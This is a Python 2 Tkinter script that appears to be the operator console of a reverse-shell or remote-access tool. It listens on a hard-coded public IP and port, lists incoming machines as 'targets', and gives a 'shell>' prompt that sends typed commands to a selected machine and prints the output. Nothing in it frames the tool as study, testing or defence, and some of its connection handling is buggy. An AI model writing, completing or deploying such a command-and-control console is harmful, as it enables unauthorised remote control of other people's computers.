from Tkinter import *
import threading
import socket
import time
class Manager(object):
    def __init__(self):

        self.address = []
        self.connction = []

        self.GUI1 = Tk()
        self.GUI1.title('welcome to admin control')
        self.GUI1.geometry('800x800')

        self.ListTargets = Listbox(self.GUI1, width=95, fg='green', bg='black', font=2)
        self.ListTargets.pack()
        self.ListTargets.bind('<<ListboxSelect>>', self.checking)
        self.butt1 = Button(self.GUI1, text='reflesh', font=5, command=self.numberConns)
        self.butt1.pack(anchor=CENTER)
        self.butt2 = Button(self.GUI1, text='dele', command=self.deleteall).pack()
        OpenConnction = threading.Thread(target=self.StartSockets)
        OpenConnction.daemon = True
        OpenConnction.start()

        mainloop()

    def StartSockets(self):

        host = '37.142.243.30'
        port = 4434

        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # solution for "[Error 89] Address already in use". Use it before bind()
                self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

                self.s.bind((host, port))
                self.s.listen(20)

                while True:
                    try:
                        self.conn, self.addr = self.s.accept()
                        #self.conn.setblocking(1)
                        self.connction.append(self.conn)
                        self.address.append(self.addr)
                        print ('hello', self.addr)
                    except Exception as e:
                        print ('problem with accept')
                        print ('exception:', e)

            except Exception as e:
                print ('problem with socket, bind or listen')
                print ('exception:', e)

                # close all socket

                for c in self.connction:
                    c.close()
                self.s.close()

                # clear all lists

                self.connction = []
                self.address = []

    def numberConns(self):
            self.ListTargets.delete(0, END)
            for self.ii, self.addr in enumerate(self.address):
                self.ListTargets.insert(self.ii, self.addr)

            try:
                for se in self.connction:
                    self.conn.send('1')
                    self.conn.recv(1024)

            except:
                del self.address[:]
                #del self.connction[:]
                self.ListTargets.delete(0, self.ii)
                self.ListTargets.delete(0, self.addr)






    def checking(self, *e):
        thevule = self.ListTargets.curselection()
        for de, thevule in enumerate(thevule):
            self.conn=self.connction[thevule]
            self.send_commands()


    def send_commands(self):
        while True:
            command = raw_input('shell> ')
            if len(str(command)) > 0:
                self.conn.send(str(command))
                response = self.conn.recv(2028)
                print response

            else:
                return self.GUI1

    def deleteall(self):
        self.ListTargets.delete(0, 0)

Manager()